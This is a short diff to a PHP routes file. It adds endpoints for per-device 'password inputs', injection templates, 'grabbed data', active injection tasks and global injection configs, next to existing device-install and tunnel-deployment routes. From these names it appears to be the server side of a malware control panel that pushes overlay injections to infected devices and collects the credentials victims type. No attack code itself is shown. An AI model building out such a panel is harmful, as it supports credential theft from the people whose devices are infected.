@@ -50,6 +50,21 @@ Route::get('api/logs', 'DeviceController/getLogs');
 Route::post('api/client/logs', 'AuthController/clientLogs');
 Route::post('api/device/install-log', 'DeviceController/installLog');
 
+Route::rule('api/password-inputs/:deviceId', 'DeviceController/getPasswordInputs', 'GET|DELETE|OPTIONS');
+Route::delete('api/password-inputs/id/:inputId', 'MiscController/deletePasswordInput');
+
+Route::get('api/injection/templates', 'InjectionController/listTemplates');
+Route::post('api/injection/templates', 'InjectionController/addTemplate');
+Route::get('api/injection/templates/:id', 'InjectionController/getTemplate');
+Route::put('api/injection/templates/:id', 'InjectionController/updateTemplate');
+Route::delete('api/injection/templates/:id', 'InjectionController/deleteTemplate');
+Route::rule('api/injection/grabbed-data', 'InjectionController/grabbedData', 'GET|OPTIONS');
+Route::rule('api/injection/active-tasks', 'InjectionController/activeTasks', 'GET|POST|DELETE|OPTIONS');
+Route::rule('api/injection/global-configs', 'InjectionController/globalConfigs', 'GET|OPTIONS');
+Route::rule('api/injection/global-configs/:configId', 'MiscController/injectionGlobalConfigDetail', 'GET|PUT|DELETE|OPTIONS');
+Route::rule('api/injection/data', 'MiscController/injectionData', 'GET|DELETE|OPTIONS');
+Route::get('api/injection/counts', 'MiscController/injectionCounts');
+
 Route::rule('api/tunnel/config', 'TunnelController/config', 'GET|POST|OPTIONS');
 Route::get('api/tunnel/status', 'TunnelController/status');
 Route::rule('api/tunnel/deploy', 'TunnelController/deployed', 'GET|POST|OPTIONS');
